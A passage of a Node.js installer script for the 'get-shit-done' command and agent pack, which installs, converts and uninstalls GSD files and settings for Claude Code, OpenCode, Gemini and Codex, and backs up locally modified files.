    for (const file of fs.readdirSync(destDir)) {

      if (file.startsWith(`${prefix}-`) && file.endsWith('.md')) {

        fs.unlinkSync(path.join(destDir, file));

      }

    }

  } else {

    fs.mkdirSync(destDir, { recursive: true });

  }

  

  const entries = fs.readdirSync(srcDir, { withFileTypes: true });

  

  for (const entry of entries) {

    const srcPath = path.join(srcDir, entry.name);

    

    if (entry.isDirectory()) {

      // Recurse into subdirectories, adding to prefix

      // e.g., commands/gsd/debug/start.md -> command/gsd-debug-start.md

      copyFlattenedCommands(srcPath, destDir, `${prefix}-${entry.name}`, pathPrefix, runtime);

    } else if (entry.name.endsWith('.md')) {

      // Flatten: help.md -> gsd-help.md

      const baseName = entry.name.replace('.md', '');

      const destName = `${prefix}-${baseName}.md`;

      const destPath = path.join(destDir, destName);



      let content = fs.readFileSync(srcPath, 'utf8');

      const globalClaudeRegex = /~\/\.claude\//g;

      const localClaudeRegex = /\.\/\.claude\//g;

      const opencodeDirRegex = /~\/\.opencode\//g;

      content = content.replace(globalClaudeRegex, pathPrefix);

      content = content.replace(localClaudeRegex, `./${getDirName(runtime)}/`);

      content = content.replace(opencodeDirRegex, pathPrefix);

      content = processAttribution(content, getCommitAttribution(runtime));

      content = convertClaudeToOpencodeFrontmatter(content);



      fs.writeFileSync(destPath, content);

    }

  }

}



function listCodexSkillNames(skillsDir, prefix = 'gsd-') {

  if (!fs.existsSync(skillsDir)) return [];

  const entries = fs.readdirSync(skillsDir, { withFileTypes: true });

  return entries

    .filter(entry => entry.isDirectory() && entry.name.startsWith(prefix))

    .filter(entry => fs.existsSync(path.join(skillsDir, entry.name, 'SKILL.md')))

    .map(entry => entry.name)

    .sort();

}



function copyCommandsAsCodexSkills(srcDir, skillsDir, prefix, pathPrefix, runtime) {

  if (!fs.existsSync(srcDir)) {

    return;

  }



  fs.mkdirSync(skillsDir, { recursive: true });



  // Remove previous GSD Codex skills to avoid stale command skills.

  const existing = fs.readdirSync(skillsDir, { withFileTypes: true });

  for (const entry of existing) {

    if (entry.isDirectory() && entry.name.startsWith(`${prefix}-`)) {

      fs.rmSync(path.join(skillsDir, entry.name), { recursive: true });

    }

  }



  function recurse(currentSrcDir, currentPrefix) {

    const entries = fs.readdirSync(currentSrcDir, { withFileTypes: true });



    for (const entry of entries) {

      const srcPath = path.join(currentSrcDir, entry.name);

      if (entry.isDirectory()) {

        recurse(srcPath, `${currentPrefix}-${entry.name}`);

        continue;

      }



      if (!entry.name.endsWith('.md')) {

        continue;

      }



      const baseName = entry.name.replace('.md', '');

      const skillName = `${currentPrefix}-${baseName}`;

      const skillDir = path.join(skillsDir, skillName);

      fs.mkdirSync(skillDir, { recursive: true });



      let content = fs.readFileSync(srcPath, 'utf8');

      const globalClaudeRegex = /~\/\.claude\//g;

      const localClaudeRegex = /\.\/\.claude\//g;

      const codexDirRegex = /~\/\.codex\//g;

      content = content.replace(globalClaudeRegex, pathPrefix);

      content = content.replace(localClaudeRegex, `./${getDirName(runtime)}/`);

      content = content.replace(codexDirRegex, pathPrefix);

      content = processAttribution(content, getCommitAttribution(runtime));

      content = convertClaudeCommandToCodexSkill(content, skillName);



      fs.writeFileSync(path.join(skillDir, 'SKILL.md'), content);

    }

  }



  recurse(srcDir, prefix);

}



/**

 * Recursively copy directory, replacing paths in .md files

 * Deletes existing destDir first to remove orphaned files from previous versions

 * @param {string} srcDir - Source directory

 * @param {string} destDir - Destination directory

 * @param {string} pathPrefix - Path prefix for file references

 * @param {string} runtime - Target runtime ('claude', 'opencode', 'gemini', 'codex')

 */

function copyWithPathReplacement(srcDir, destDir, pathPrefix, runtime, isCommand = false) {

  const isOpencode = runtime === 'opencode';

  const isCodex = runtime === 'codex';

  const dirName = getDirName(runtime);



  // Clean install: remove existing destination to prevent orphaned files

  if (fs.existsSync(destDir)) {

    fs.rmSync(destDir, { recursive: true });

  }

  fs.mkdirSync(destDir, { recursive: true });



  const entries = fs.readdirSync(srcDir, { withFileTypes: true });



  for (const entry of entries) {

    const srcPath = path.join(srcDir, entry.name);

    const destPath = path.join(destDir, entry.name);



    if (entry.isDirectory()) {

      copyWithPathReplacement(srcPath, destPath, pathPrefix, runtime, isCommand);

    } else if (entry.name.endsWith('.md')) {

      // Replace ~/.claude/ and ./.claude/ with runtime-appropriate paths

      let content = fs.readFileSync(srcPath, 'utf8');

      const globalClaudeRegex = /~\/\.claude\//g;

      const localClaudeRegex = /\.\/\.claude\//g;

      content = content.replace(globalClaudeRegex, pathPrefix);

      content = content.replace(localClaudeRegex, `./${dirName}/`);

      content = processAttribution(content, getCommitAttribution(runtime));



      // Convert frontmatter for opencode compatibility

      if (isOpencode) {

        content = convertClaudeToOpencodeFrontmatter(content);

        fs.writeFileSync(destPath, content);

      } else if (runtime === 'gemini') {

        if (isCommand) {

          // Convert to TOML for Gemini (strip <sub> tags — terminals can't render subscript)

          content = stripSubTags(content);

          const tomlContent = convertClaudeToGeminiToml(content);

          // Replace extension with .toml

          const tomlPath = destPath.replace(/\.md$/, '.toml');

          fs.writeFileSync(tomlPath, tomlContent);

        } else {

          fs.writeFileSync(destPath, content);

        }

      } else if (isCodex) {

        content = convertClaudeToCodexMarkdown(content);

        fs.writeFileSync(destPath, content);

      } else {

        fs.writeFileSync(destPath, content);

      }

    } else {

      fs.copyFileSync(srcPath, destPath);

    }

  }

}



/**

 * Clean up orphaned files from previous GSD versions

 */

function cleanupOrphanedFiles(configDir) {

  const orphanedFiles = [

    'hooks/gsd-notify.sh',  // Removed in v1.6.x

    'hooks/statusline.js',  // Renamed to gsd-statusline.js in v1.9.0

  ];



  for (const relPath of orphanedFiles) {

    const fullPath = path.join(configDir, relPath);

    if (fs.existsSync(fullPath)) {

      fs.unlinkSync(fullPath);

      console.log(`  ${green}✓${reset} Removed orphaned ${relPath}`);

    }

  }

}



/**

 * Clean up orphaned hook registrations from settings.json

 */

function cleanupOrphanedHooks(settings) {

  const orphanedHookPatterns = [

    'gsd-notify.sh',  // Removed in v1.6.x

    'hooks/statusline.js',  // Renamed to gsd-statusline.js in v1.9.0

    'gsd-intel-index.js',  // Removed in v1.9.2

    'gsd-intel-session.js',  // Removed in v1.9.2

    'gsd-intel-prune.js',  // Removed in v1.9.2

  ];



  let cleanedHooks = false;



  // Check all hook event types (Stop, SessionStart, etc.)

  if (settings.hooks) {

    for (const eventType of Object.keys(settings.hooks)) {

      const hookEntries = settings.hooks[eventType];

      if (Array.isArray(hookEntries)) {

        // Filter out entries that contain orphaned hooks

        const filtered = hookEntries.filter(entry => {

          if (entry.hooks && Array.isArray(entry.hooks)) {

            // Check if any hook in this entry matches orphaned patterns

            const hasOrphaned = entry.hooks.some(h =>

              h.command && orphanedHookPatterns.some(pattern => h.command.includes(pattern))

            );

            if (hasOrphaned) {

              cleanedHooks = true;

              return false;  // Remove this entry

            }

          }

          return true;  // Keep this entry

        });

        settings.hooks[eventType] = filtered;

      }

    }

  }



  if (cleanedHooks) {

    console.log(`  ${green}✓${reset} Removed orphaned hook registrations`);

  }



  // Fix #330: Update statusLine if it points to old GSD statusline.js path

  // Only match the specific old GSD path pattern (hooks/statusline.js),

  // not third-party statusline scripts that happen to contain 'statusline.js'

  if (settings.statusLine && settings.statusLine.command &&

      /hooks[\/\\]statusline\.js/.test(settings.statusLine.command)) {

    settings.statusLine.command = settings.statusLine.command.replace(

      /hooks([\/\\])statusline\.js/,

      'hooks$1gsd-statusline.js'

    );

    console.log(`  ${green}✓${reset} Updated statusline path (hooks/statusline.js → hooks/gsd-statusline.js)`);

  }



  return settings;

}



/**

 * Uninstall GSD from the specified directory for a specific runtime

 * Removes only GSD-specific files/directories, preserves user content

 * @param {boolean} isGlobal - Whether to uninstall from global or local

 * @param {string} runtime - Target runtime ('claude', 'opencode', 'gemini', 'codex')

 */

function uninstall(isGlobal, runtime = 'claude') {

  const isOpencode = runtime === 'opencode';

  const isCodex = runtime === 'codex';

  const dirName = getDirName(runtime);



  // Get the target directory based on runtime and install type

  const targetDir = isGlobal

    ? getGlobalDir(runtime, explicitConfigDir)

    : path.join(process.cwd(), dirName);



  const locationLabel = isGlobal

    ? targetDir.replace(os.homedir(), '~')

    : targetDir.replace(process.cwd(), '.');



  let runtimeLabel = 'Claude Code';

  if (runtime === 'opencode') runtimeLabel = 'OpenCode';

  if (runtime === 'gemini') runtimeLabel = 'Gemini';

  if (runtime === 'codex') runtimeLabel = 'Codex';



  console.log(`  Uninstalling GSD from ${cyan}${runtimeLabel}${reset} at ${cyan}${locationLabel}${reset}\n`);



  // Check if target directory exists

  if (!fs.existsSync(targetDir)) {

    console.log(`  ${yellow}⚠${reset} Directory does not exist: ${locationLabel}`);

    console.log(`  Nothing to uninstall.\n`);

    return;

  }



  let removedCount = 0;



  // 1. Remove GSD commands/skills

  if (isOpencode) {

    // OpenCode: remove command/gsd-*.md files

    const commandDir = path.join(targetDir, 'command');

    if (fs.existsSync(commandDir)) {

      const files = fs.readdirSync(commandDir);

      for (const file of files) {

        if (file.startsWith('gsd-') && file.endsWith('.md')) {

          fs.unlinkSync(path.join(commandDir, file));

          removedCount++;

        }

      }

      console.log(`  ${green}✓${reset} Removed GSD commands from command/`);

    }

  } else if (isCodex) {

    // Codex: remove skills/gsd-*/SKILL.md skill directories

    const skillsDir = path.join(targetDir, 'skills');

    if (fs.existsSync(skillsDir)) {

      let skillCount = 0;

      const entries = fs.readdirSync(skillsDir, { withFileTypes: true });

      for (const entry of entries) {

        if (entry.isDirectory() && entry.name.startsWith('gsd-')) {

          fs.rmSync(path.join(skillsDir, entry.name), { recursive: true });

          skillCount++;

        }

      }

      if (skillCount > 0) {

        removedCount++;

        console.log(`  ${green}✓${reset} Removed ${skillCount} Codex skills`);

      }

    }



    // Codex: remove GSD agent .toml config files

    const codexAgentsDir = path.join(targetDir, 'agents');

    if (fs.existsSync(codexAgentsDir)) {

      const tomlFiles = fs.readdirSync(codexAgentsDir);

      let tomlCount = 0;

      for (const file of tomlFiles) {

        if (file.startsWith('gsd-') && file.endsWith('.toml')) {

          fs.unlinkSync(path.join(codexAgentsDir, file));

          tomlCount++;

        }

      }

      if (tomlCount > 0) {

        removedCount++;

        console.log(`  ${green}✓${reset} Removed ${tomlCount} agent .toml configs`);

      }

    }



    // Codex: clean GSD sections from config.toml

    const configPath = path.join(targetDir, 'config.toml');

    if (fs.existsSync(configPath)) {

      const content = fs.readFileSync(configPath, 'utf8');

      const cleaned = stripGsdFromCodexConfig(content);

      if (cleaned === null) {

        // File is empty after stripping — delete it

        fs.unlinkSync(configPath);

        removedCount++;

        console.log(`  ${green}✓${reset} Removed config.toml (was GSD-only)`);

      } else if (cleaned !== content) {

        fs.writeFileSync(configPath, cleaned);

        removedCount++;

        console.log(`  ${green}✓${reset} Cleaned GSD sections from config.toml`);

      }

    }

  } else {

    // Claude Code & Gemini: remove commands/gsd/ directory

    const gsdCommandsDir = path.join(targetDir, 'commands', 'gsd');

    if (fs.existsSync(gsdCommandsDir)) {

      fs.rmSync(gsdCommandsDir, { recursive: true });

      removedCount++;

      console.log(`  ${green}✓${reset} Removed commands/gsd/`);

    }

  }



  // 2. Remove get-shit-done directory

  const gsdDir = path.join(targetDir, 'get-shit-done');

  if (fs.existsSync(gsdDir)) {

    fs.rmSync(gsdDir, { recursive: true });

    removedCount++;

    console.log(`  ${green}✓${reset} Removed get-shit-done/`);

  }



  // 3. Remove GSD agents (gsd-*.md files only)

  const agentsDir = path.join(targetDir, 'agents');

  if (fs.existsSync(agentsDir)) {

    const files = fs.readdirSync(agentsDir);

    let agentCount = 0;

    for (const file of files) {

      if (file.startsWith('gsd-') && file.endsWith('.md')) {

        fs.unlinkSync(path.join(agentsDir, file));

        agentCount++;

      }

    }

    if (agentCount > 0) {

      removedCount++;

      console.log(`  ${green}✓${reset} Removed ${agentCount} GSD agents`);

    }

  }



  // 4. Remove GSD hooks

  const hooksDir = path.join(targetDir, 'hooks');

  if (fs.existsSync(hooksDir)) {

    const gsdHooks = ['gsd-statusline.js', 'gsd-check-update.js', 'gsd-check-update.sh', 'gsd-context-monitor.js'];

    let hookCount = 0;

    for (const hook of gsdHooks) {

      const hookPath = path.join(hooksDir, hook);

      if (fs.existsSync(hookPath)) {

        fs.unlinkSync(hookPath);

        hookCount++;

      }

    }

    if (hookCount > 0) {

      removedCount++;

      console.log(`  ${green}✓${reset} Removed ${hookCount} GSD hooks`);

    }

  }



  // 5. Remove GSD package.json (CommonJS mode marker)

  const pkgJsonPath = path.join(targetDir, 'package.json');

  if (fs.existsSync(pkgJsonPath)) {

    try {

      const content = fs.readFileSync(pkgJsonPath, 'utf8').trim();

      // Only remove if it's our minimal CommonJS marker

      if (content === '{"type":"commonjs"}') {

        fs.unlinkSync(pkgJsonPath);

        removedCount++;

        console.log(`  ${green}✓${reset} Removed GSD package.json`);

      }

    } catch (e) {

      // Ignore read errors

    }

  }



  // 6. Clean up settings.json (remove GSD hooks and statusline)

  const settingsPath = path.join(targetDir, 'settings.json');

  if (fs.existsSync(settingsPath)) {

    let settings = readSettings(settingsPath);

    let settingsModified = false;



    // Remove GSD statusline if it references our hook

    if (settings.statusLine && settings.statusLine.command &&

        settings.statusLine.command.includes('gsd-statusline')) {

      delete settings.statusLine;

      settingsModified = true;

      console.log(`  ${green}✓${reset} Removed GSD statusline from settings`);

    }



    // Remove GSD hooks from SessionStart

    if (settings.hooks && settings.hooks.SessionStart) {

      const before = settings.hooks.SessionStart.length;

      settings.hooks.SessionStart = settings.hooks.SessionStart.filter(entry => {

        if (entry.hooks && Array.isArray(entry.hooks)) {

          // Filter out GSD hooks

          const hasGsdHook = entry.hooks.some(h =>

            h.command && (h.command.includes('gsd-check-update') || h.command.includes('gsd-statusline'))

          );

          return !hasGsdHook;

        }

        return true;

      });

      if (settings.hooks.SessionStart.length < before) {

        settingsModified = true;

        console.log(`  ${green}✓${reset} Removed GSD hooks from settings`);

      }

      // Clean up empty array

      if (settings.hooks.SessionStart.length === 0) {

        delete settings.hooks.SessionStart;

      }

    }



    // Remove GSD hooks from PostToolUse

    if (settings.hooks && settings.hooks.PostToolUse) {

      const before = settings.hooks.PostToolUse.length;

      settings.hooks.PostToolUse = settings.hooks.PostToolUse.filter(entry => {

        if (entry.hooks && Array.isArray(entry.hooks)) {

          const hasGsdHook = entry.hooks.some(h =>

            h.command && h.command.includes('gsd-context-monitor')

          );

          return !hasGsdHook;

        }

        return true;

      });

      if (settings.hooks.PostToolUse.length < before) {

        settingsModified = true;

        console.log(`  ${green}✓${reset} Removed context monitor hook from settings`);

      }

      if (settings.hooks.PostToolUse.length === 0) {

        delete settings.hooks.PostToolUse;

      }

    }



    // Clean up empty hooks object

    if (settings.hooks && Object.keys(settings.hooks).length === 0) {

      delete settings.hooks;

    }



    if (settingsModified) {

      writeSettings(settingsPath, settings);

      removedCount++;

    }

  }



  // 6. For OpenCode, clean up permissions from opencode.json

  if (isOpencode) {

    // For local uninstalls, clean up ./.opencode/opencode.json

    // For global uninstalls, clean up ~/.config/opencode/opencode.json

    const opencodeConfigDir = isGlobal

      ? getOpencodeGlobalDir()

      : path.join(process.cwd(), '.opencode');

    const configPath = path.join(opencodeConfigDir, 'opencode.json');

    if (fs.existsSync(configPath)) {

      try {

        const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));

        let modified = false;



        // Remove GSD permission entries

        if (config.permission) {

          for (const permType of ['read', 'external_directory']) {

            if (config.permission[permType]) {

              const keys = Object.keys(config.permission[permType]);

              for (const key of keys) {

                if (key.includes('get-shit-done')) {

                  delete config.permission[permType][key];

                  modified = true;

                }

              }

              // Clean up empty objects

              if (Object.keys(config.permission[permType]).length === 0) {

                delete config.permission[permType];

              }

            }

          }

          if (Object.keys(config.permission).length === 0) {

            delete config.permission;

          }

        }



        if (modified) {

          fs.writeFileSync(configPath, JSON.stringify(config, null, 2) + '\n');

          removedCount++;

          console.log(`  ${green}✓${reset} Removed GSD permissions from opencode.json`);

        }

      } catch (e) {

        // Ignore JSON parse errors

      }

    }

  }



  if (removedCount === 0) {

    console.log(`  ${yellow}⚠${reset} No GSD files found to remove.`);

  }



  console.log(`

  ${green}Done!${reset} GSD has been uninstalled from ${runtimeLabel}.

  Your other files and settings have been preserved.

`);

}



/**

 * Parse JSONC (JSON with Comments) by stripping comments and trailing commas.

 * OpenCode supports JSONC format via jsonc-parser, so users may have comments.

 * This is a lightweight inline parser to avoid adding dependencies.

 */

function parseJsonc(content) {

  // Strip BOM if present

  if (content.charCodeAt(0) === 0xFEFF) {

    content = content.slice(1);

  }



  // Remove single-line and block comments while preserving strings

  let result = '';

  let inString = false;

  let i = 0;

  while (i < content.length) {

    const char = content[i];

    const next = content[i + 1];



    if (inString) {

      result += char;

      // Handle escape sequences

      if (char === '\\' && i + 1 < content.length) {

        result += next;

        i += 2;

        continue;

      }

      if (char === '"') {

        inString = false;

      }

      i++;

    } else {

      if (char === '"') {

        inString = true;

        result += char;

        i++;

      } else if (char === '/' && next === '/') {

        // Skip single-line comment until end of line

        while (i < content.length && content[i] !== '\n') {

          i++;

        }

      } else if (char === '/' && next === '*') {

        // Skip block comment

        i += 2;

        while (i < content.length - 1 && !(content[i] === '*' && content[i + 1] === '/')) {

          i++;

        }

        i += 2; // Skip closing */

      } else {

        result += char;

        i++;

      }

    }

  }



  // Remove trailing commas before } or ]

  result = result.replace(/,(\s*[}\]])/g, '$1');



  return JSON.parse(result);

}



/**

 * Configure OpenCode permissions to allow reading GSD reference docs

 * This prevents permission prompts when GSD accesses the get-shit-done directory

 * @param {boolean} isGlobal - Whether this is a global or local install

 */

function configureOpencodePermissions(isGlobal = true) {

  // For local installs, use ./.opencode/opencode.json

  // For global installs, use ~/.config/opencode/opencode.json

  const opencodeConfigDir = isGlobal

    ? getOpencodeGlobalDir()

    : path.join(process.cwd(), '.opencode');

  const configPath = path.join(opencodeConfigDir, 'opencode.json');



  // Ensure config directory exists

  fs.mkdirSync(opencodeConfigDir, { recursive: true });



  // Read existing config or create empty object

  let config = {};

  if (fs.existsSync(configPath)) {

    try {

      const content = fs.readFileSync(configPath, 'utf8');

      config = parseJsonc(content);

    } catch (e) {

      // Cannot parse - DO NOT overwrite user's config

      console.log(`  ${yellow}⚠${reset} Could not parse opencode.json - skipping permission config`);

      console.log(`    ${dim}Reason: ${e.message}${reset}`);

      console.log(`    ${dim}Your config was NOT modified. Fix the syntax manually if needed.${reset}`);

      return;

    }

  }



  // Ensure permission structure exists

  if (!config.permission) {

    config.permission = {};

  }



  // Build the GSD path using the actual config directory

  // Use ~ shorthand if it's in the default location, otherwise use full path

  const defaultConfigDir = path.join(os.homedir(), '.config', 'opencode');

  const gsdPath = opencodeConfigDir === defaultConfigDir

    ? '~/.config/opencode/get-shit-done/*'

    : `${opencodeConfigDir.replace(/\\/g, '/')}/get-shit-done/*`;

  

  let modified = false;



  // Configure read permission

  if (!config.permission.read || typeof config.permission.read !== 'object') {

    config.permission.read = {};

  }

  if (config.permission.read[gsdPath] !== 'allow') {

    config.permission.read[gsdPath] = 'allow';

    modified = true;

  }



  // Configure external_directory permission (the safety guard for paths outside project)

  if (!config.permission.external_directory || typeof config.permission.external_directory !== 'object') {

    config.permission.external_directory = {};

  }

  if (config.permission.external_directory[gsdPath] !== 'allow') {

    config.permission.external_directory[gsdPath] = 'allow';

    modified = true;

  }



  if (!modified) {

    return; // Already configured

  }



  // Write config back

  fs.writeFileSync(configPath, JSON.stringify(config, null, 2) + '\n');

  console.log(`  ${green}✓${reset} Configured read permission for GSD docs`);

}



/**

 * Verify a directory exists and contains files

 */

function verifyInstalled(dirPath, description) {

  if (!fs.existsSync(dirPath)) {

    console.error(`  ${yellow}✗${reset} Failed to install ${description}: directory not created`);

    return false;

  }

  try {

    const entries = fs.readdirSync(dirPath);

    if (entries.length === 0) {

      console.error(`  ${yellow}✗${reset} Failed to install ${description}: directory is empty`);

      return false;

    }

  } catch (e) {

    console.error(`  ${yellow}✗${reset} Failed to install ${description}: ${e.message}`);

    return false;

  }

  return true;

}



/**

 * Verify a file exists

 */

function verifyFileInstalled(filePath, description) {

  if (!fs.existsSync(filePath)) {

    console.error(`  ${yellow}✗${reset} Failed to install ${description}: file not created`);

    return false;

  }

  return true;

}



/**

 * Install to the specified directory for a specific runtime

 * @param {boolean} isGlobal - Whether to install globally or locally

 * @param {string} runtime - Target runtime ('claude', 'opencode', 'gemini', 'codex')

 */



// ──────────────────────────────────────────────────────

// Local Patch Persistence

// ──────────────────────────────────────────────────────



const PATCHES_DIR_NAME = 'gsd-local-patches';

const MANIFEST_NAME = 'gsd-file-manifest.json';



/**

 * Compute SHA256 hash of file contents

 */

function fileHash(filePath) {

  const content = fs.readFileSync(filePath);

  return crypto.createHash('sha256').update(content).digest('hex');

}



/**

 * Recursively collect all files in dir with their hashes

 */

function generateManifest(dir, baseDir) {

  if (!baseDir) baseDir = dir;

  const manifest = {};

  if (!fs.existsSync(dir)) return manifest;

  const entries = fs.readdirSync(dir, { withFileTypes: true });

  for (const entry of entries) {

    const fullPath = path.join(dir, entry.name);

    const relPath = path.relative(baseDir, fullPath).replace(/\\/g, '/');

    if (entry.isDirectory()) {

      Object.assign(manifest, generateManifest(fullPath, baseDir));

    } else {

      manifest[relPath] = fileHash(fullPath);

    }

  }

  return manifest;

}



/**

 * Write file manifest after installation for future modification detection

 */

function writeManifest(configDir, runtime = 'claude') {

  const isOpencode = runtime === 'opencode';

  const isCodex = runtime === 'codex';

  const gsdDir = path.join(configDir, 'get-shit-done');

  const commandsDir = path.join(configDir, 'commands', 'gsd');

  const opencodeCommandDir = path.join(configDir, 'command');

  const codexSkillsDir = path.join(configDir, 'skills');

  const agentsDir = path.join(configDir, 'agents');

  const manifest = { version: pkg.version, timestamp: new Date().toISOString(), files: {} };



  const gsdHashes = generateManifest(gsdDir);

  for (const [rel, hash] of Object.entries(gsdHashes)) {

    manifest.files['get-shit-done/' + rel] = hash;

  }

  if (!isOpencode && !isCodex && fs.existsSync(commandsDir)) {

    const cmdHashes = generateManifest(commandsDir);

    for (const [rel, hash] of Object.entries(cmdHashes)) {

      manifest.files['commands/gsd/' + rel] = hash;

    }

  }

  if (isOpencode && fs.existsSync(opencodeCommandDir)) {

    for (const file of fs.readdirSync(opencodeCommandDir)) {

      if (file.startsWith('gsd-') && file.endsWith('.md')) {

        manifest.files['command/' + file] = fileHash(path.join(opencodeCommandDir, file));

      }

    }

  }

  if (isCodex && fs.existsSync(codexSkillsDir)) {

    for (const skillName of listCodexSkillNames(codexSkillsDir)) {

      const skillRoot = path.join(codexSkillsDir, skillName);

      const skillHashes = generateManifest(skillRoot);

      for (const [rel, hash] of Object.entries(skillHashes)) {

        manifest.files[`skills/${skillName}/${rel}`] = hash;

      }

    }

  }

  if (fs.existsSync(agentsDir)) {

    for (const file of fs.readdirSync(agentsDir)) {

      if (file.startsWith('gsd-') && file.endsWith('.md')) {

        manifest.files['agents/' + file] = fileHash(path.join(agentsDir, file));

      }

    }

  }



  fs.writeFileSync(path.join(configDir, MANIFEST_NAME), JSON.stringify(manifest, null, 2));

  return manifest;

}



/**

 * Detect user-modified GSD files by comparing against install manifest.

 * Backs up modified files to gsd-local-patches/ for reapply after update.

 */

function saveLocalPatches(configDir) {

  const manifestPath = path.join(configDir, MANIFEST_NAME);

  if (!fs.existsSync(manifestPath)) return [];



  let manifest;

  try { manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8')); } catch { return []; }



  const patchesDir = path.join(configDir, PATCHES_DIR_NAME);

  const modified = [];



  for (const [relPath, originalHash] of Object.entries(manifest.files || {})) {

    const fullPath = path.join(configDir, relPath);

    if (!fs.existsSync(fullPath)) continue;

    const currentHash = fileHash(fullPath);

    if (currentHash !== originalHash) {

      const backupPath = path.join(patchesDir, relPath);

      fs.mkdirSync(path.dirname(backupPath), { recursive: true });

      fs.copyFileSync(fullPath, backupPath);

      modified.push(relPath);

    }

  }



  if (modified.length > 0) {

    const meta = {

      backed_up_at: new Date().toISOString(),

      from_version: manifest.version,

      files: modified

    };

    fs.writeFileSync(path.join(patchesDir, 'backup-meta.json'), JSON.stringify(meta, null, 2));

    console.log('  ' + yellow + 'i' + reset + '  Found ' + modified.length + ' locally modified GSD file(s) — backed up to ' + PATCHES_DIR_NAME + '/');

    for (const f of modified) {

      console.log('     ' + dim + f + reset);

    }

  }

  return modified;

}



/**

 * After install, report backed-up patches for user to reapply.

 */

function reportLocalPatches(configDir, runtime = 'claude') {

  const patchesDir = path.join(configDir, PATCHES_DIR_NAME);

  const metaPath = path.join(patchesDir, 'backup-meta.json');

  if (!fs.existsSync(metaPath)) return [];



  let meta;

  try { meta = JSON.parse(fs.readFileSync(metaPath, 'utf8')); } catch { return []; }



  if (meta.files && meta.files.length > 0) {

    const reapplyCommand = runtime === 'opencode'

      ? '/gsd-reapply-patches'

      : runtime === 'codex'

        ? '$gsd-reapply-patches'

        : '/gsd:reapply-patches';

    console.log('');

    console.log('  ' + yellow + 'Local patches detected' + reset + ' (from v' + meta.from_version + '):');

    for (const f of meta.files) {

      console.log('     ' + cyan + f + reset);

    }

    console.log('');

    console.log('  Your modifications are saved in ' + cyan + PATCHES_DIR_NAME + '/' + reset);

    console.log('  Run ' + cyan + reapplyCommand + reset + ' to merge them into the new version.');

    console.log('  Or manually compare and merge the files.');

    console.log('');

  }

  return meta.files || [];

}



function install(isGlobal, runtime = 'claude') {

  const isOpencode = runtime === 'opencode';

  const isGemini = runtime === 'gemini';

  const isCodex = runtime === 'codex';

  const dirName = getDirName(runtime);

  const src = path.join(__dirname, '..');



  // Get the target directory based on runtime and install type

  const targetDir = isGlobal

    ? getGlobalDir(runtime, explicitConfigDir)

    : path.join(process.cwd(), dirName);



  const locationLabel = isGlobal

    ? targetDir.replace(os.homedir(), '~')

    : targetDir.replace(process.cwd(), '.');



  // Path prefix for file references in markdown content

  // For global installs: use full path

  // For local installs: use relative

  const pathPrefix = isGlobal

    ? `${targetDir.replace(/\\/g, '/')}/`

    : `./${dirName}/`;



  let runtimeLabel = 'Claude Code';

  if (isOpencode) runtimeLabel = 'OpenCode';

  if (isGemini) runtimeLabel = 'Gemini';

  if (isCodex) runtimeLabel = 'Codex';



  console.log(`  Installing for ${cyan}${runtimeLabel}${reset} to ${cyan}${locationLabel}${reset}\n`);



  // Track installation failures

  const failures = [];



  // Save any locally modified GSD files before they get wiped

  saveLocalPatches(targetDir);



  // Clean up orphaned files from previous versions

  cleanupOrphanedFiles(targetDir);



  // OpenCode uses command/ (flat), Codex uses skills/, Claude/Gemini use commands/gsd/

  if (isOpencode) {

    // OpenCode: flat structure in command/ directory

    const commandDir = path.join(targetDir, 'command');

    fs.mkdirSync(commandDir, { recursive: true });

    

    // Copy commands/gsd/*.md as command/gsd-*.md (flatten structure)

    const gsdSrc = path.join(src, 'commands', 'gsd');

    copyFlattenedCommands(gsdSrc, commandDir, 'gsd', pathPrefix, runtime);

    if (verifyInstalled(commandDir, 'command/gsd-*')) {

      const count = fs.readdirSync(commandDir).filter(f => f.startsWith('gsd-')).length;

      console.log(`  ${green}✓${reset} Installed ${count} commands to command/`);

    } else {

      failures.push('command/gsd-*');

    }

  } else if (isCodex) {

    const skillsDir = path.join(targetDir, 'skills');

    const gsdSrc = path.join(src, 'commands', 'gsd');

    copyCommandsAsCodexSkills(gsdSrc, skillsDir, 'gsd', pathPrefix, runtime);

    const installedSkillNames = listCodexSkillNames(skillsDir);

    if (installedSkillNames.length > 0) {

      console.log(`  ${green}✓${reset} Installed ${installedSkillNames.length} skills to skills/`);

    } else {

      failures.push('skills/gsd-*');

    }

  } else {

    // Claude Code & Gemini: nested structure in commands/ directory

    const commandsDir = path.join(targetDir, 'commands');

    fs.mkdirSync(commandsDir, { recursive: true });

    

    const gsdSrc = path.join(src, 'commands', 'gsd');

    const gsdDest = path.join(commandsDir, 'gsd');

    copyWithPathReplacement(gsdSrc, gsdDest, pathPrefix, runtime, true);

    if (verifyInstalled(gsdDest, 'commands/gsd')) {

      console.log(`  ${green}✓${reset} Installed commands/gsd`);

    } else {

      failures.push('commands/gsd');

    }

  }



  // Copy get-shit-done skill with path replacement

  const skillSrc = path.join(src, 'get-shit-done');

  const skillDest = path.join(targetDir, 'get-shit-done');

  copyWithPathReplacement(skillSrc, skillDest, pathPrefix, runtime);

  if (verifyInstalled(skillDest, 'get-shit-done')) {

    console.log(`  ${green}✓${reset} Installed get-shit-done`);

  } else {

    failures.push('get-shit-done');

  }



  // Copy agents to agents directory

  const agentsSrc = path.join(src, 'agents');

  if (fs.existsSync(agentsSrc)) {

    const agentsDest = path.join(targetDir, 'agents');

    fs.mkdirSync(agentsDest, { recursive: true });



    // Remove old GSD agents (gsd-*.md) before copying new ones

    if (fs.existsSync(agentsDest)) {

      for (const file of fs.readdirSync(agentsDest)) {

        if (file.startsWith('gsd-') && file.endsWith('.md')) {

          fs.unlinkSync(path.join(agentsDest, file));

        }

      }

    }



    // Copy new agents

    const agentEntries = fs.readdirSync(agentsSrc, { withFileTypes: true });

    for (const entry of agentEntries) {

      if (entry.isFile() && entry.name.endsWith('.md')) {

        let content = fs.readFileSync(path.join(agentsSrc, entry.name), 'utf8');

        // Always replace ~/.claude/ as it is the source of truth in the repo

        const dirRegex = /~\/\.claude\//g;

        content = content.replace(dirRegex, pathPrefix);

        content = processAttribution(content, getCommitAttribution(runtime));

        // Convert frontmatter for runtime compatibility

        if (isOpencode) {

          content = convertClaudeToOpencodeFrontmatter(content);

        } else if (isGemini) {

          content = convertClaudeToGeminiAgent(content);

        } else if (isCodex) {

          content = convertClaudeAgentToCodexAgent(content);

        }

        fs.writeFileSync(path.join(agentsDest, entry.name), content);

      }

    }

    if (verifyInstalled(agentsDest, 'agents')) {

      console.log(`  ${green}✓${reset} Installed agents`);

    } else {
